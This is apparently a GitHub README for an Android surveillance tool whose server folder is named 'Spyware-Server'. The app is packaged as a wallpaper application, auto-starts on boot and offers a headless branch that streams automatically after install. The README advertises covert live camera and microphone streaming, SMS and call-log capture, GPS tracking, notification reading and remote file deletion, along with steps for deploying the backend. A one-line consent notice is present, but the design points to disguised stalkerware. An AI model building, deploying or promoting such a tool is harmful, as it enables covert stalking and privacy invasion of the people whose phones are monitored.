# 📱 Android Surveillance Hub

<div align="center">
  <img src="./SpywareDashboard.gif" alt="App Demo" width="100%" />
</div>

<div align="center">
  <h3>📡 Real-time Android Device Monitoring &amp; Control</h3>
  <p><em>WebRTC-powered surveillance dashboard with PHP admin panel and Node.js signaling on Render.com</em></p>
</div>

---

## 🌟 Overview

This project lets you **remotely monitor and control an Android device** from a web browser. The system uses **WebRTC** for low-latency peer-to-peer video/audio streaming and **Socket.IO** for real-time signaling, data sync, and remote commands.

**Architecture:**
```
PHP Host (login + HTML)  ◄── Browser JS ──►  Render.com (Node.js + Socket.IO)
                                  ▲
                                  │ WebRTC
                                  ▼
                           Android Device
```

> ⚖️ **Legal Notice**: Streaming camera, microphone, SMS, call logs, and location data may be restricted by law in your jurisdiction. Always obtain informed consent from the device owner and comply with all applicable regulations.

---

## ✨ Features

### 🎯 Capture & Record (NEW)
| Feature | Description |
|---------|-------------|
| 📸 **Capture Photo** | Takes an instant photo via Android camera — result shown inline in panel |
| 🖥️ **Screenshot** | Captures current Android screen — PNG preview + download |
| 🎙️ **Voice Recording** | Start/stop mic recording — audio player + download in panel |
| 🎥 **Video Recording** | Start/stop camera recording — video player + download in panel |

### 📷 Live Streaming
- **Dual Camera**: Front + back camera streamed simultaneously
- **Audio**: Live microphone feed to browser
- **Low Latency**: Direct WebRTC peer-to-peer connection
- **STUN/TURN**: Works across NAT/firewalls

### 📱 Device Monitoring
- 💬 **Live SMS** — real-time incoming messages
- 📞 **Call Logs** — full history with timestamps
- 🗺️ **GPS Location** — live tracking on interactive map
- 🔔 **Notifications** — live feed from all apps
- 📂 **File Explorer** — browse, download, delete files remotely

### 🎮 Remote Controls
- 🔦 Torch ON/OFF
- 🔄 Switch Camera (front/back)
- 🔃 Force Data Sync

### 🔗 PHP + Node.js Split Architecture
- PHP handles **login, sessions, HTML** only (runs on any cheap shared host)
- Node.js on **Render.com** handles **all real-time work**
- `config.js.php` dynamically injects the Render URL into JS — no hardcoded URLs

---

## 🏗️ Project Structure

```
📦 WebRTC-Android-prentcontrol/
├── 📱 app/
│   └── src/main/java/com/example/wallpaperapplication/
│       ├── BootReceiver.java          # Auto-start on boot
│       ├── ConsentActivity.java       # Permission management
│       ├── Constants.java             # App config
│       ├── MainActivity.java          # Main interface
│       ├── StreamingService.java      # Core WebRTC + Socket.IO service
│       └── StreamingSettingsActivity.java
├── 🖥️ Android-WebRTC-Spyware-Server/
│   ├── server.js                      # Node.js — runs on Render.com
│   ├── package.json
│   └── public/
│       ├── auth.php                   # Session guard
│       ├── login.php                  # Admin login
│       ├── logout.php
│       ├── config.js.php              # Outputs RENDER_SERVER_URL to JS
│       └── index.php                  # Full admin dashboard
├── SETUP.md                           # Full step-by-step setup guide
└── README.md
```

---

## 🚀 Quick Start

> 📖 See **[SETUP.md](./SETUP.md)** for the full detailed guide.

### 1. Deploy Node.js on Render
```bash
# In Render dashboard:
# Root: Android-WebRTC-Spyware-Server
# Build: npm install
# Start: node server.js
```

### 2. Set your Render URL
```php
// Android-WebRTC-Spyware-Server/public/config.js.php
$RENDER_SERVER_URL = 'https://YOUR-APP.onrender.com';
```

### 3. Add your PHP domain to CORS
```js
// Android-WebRTC-Spyware-Server/server.js
const ALLOWED_ORIGINS = [
    'https://YOUR-PHP-DOMAIN.com',
    ...
];
```

### 4. Upload `public/` to PHP host, build Android app
```
https://YOUR-PHP-DOMAIN.com/  →  Login  →  Dashboard
```

---

## 🎯 Admin Panel — Capture & Record

The dashboard has a dedicated **Capture & Record Controls** panel at the top:

- **📸 Capture Photo** — one click → photo appears in gallery with download button
- **🖥️ Screenshot** — one click → PNG preview + download
- **🎙️ Record Voice** — click to start, click again to stop → audio player + download
- **🎥 Record Video** — click to start, click again to stop → video player + download
- All captures are **stored in-browser** for the session, with a **Clear All** button

---

## 🌐 Browser Compatibility

| Browser | Support |
|---------|--------|
| Chrome 80+ | ✅ Recommended |
| Firefox 75+ | ✅ Full support |
| Edge 80+ | ✅ Full support |
| Safari 13+ | ✅ Supported |

---

## 🔀 Branches

| Branch | Description |
|--------|-------------|
| **main** | Standard build — manual stream toggle |
| **autostream** | Headless — starts streaming automatically after install |

---

## ⚠️ Known Limitations

- Capture/Record buttons require Android app to implement the Socket.IO event handlers (`capture:photo`, `record:voice:start`, etc.) — see [SETUP.md](./SETUP.md)
- Render free tier sleeps after 15 minutes of inactivity — first connection may be slow
- Dual camera requires Android 9+ (API 28+)
- File download uses chunked base64 transfer — large files may be slow

---

## 📜 License

MIT License — see [LICENSE](./LICENSE) for details.

---

<div align="center">

### 🤝 Contributing
Pull requests welcome! Please open an issue first for major changes.

### 🐛 Bugs & Support
[GitHub Issues](https://github.com/david0154/WebRTC-Android-prentcontrol/issues)

---

*Built with ❤️ using Kotlin · Node.js · Socket.IO · WebRTC · PHP*

</div>
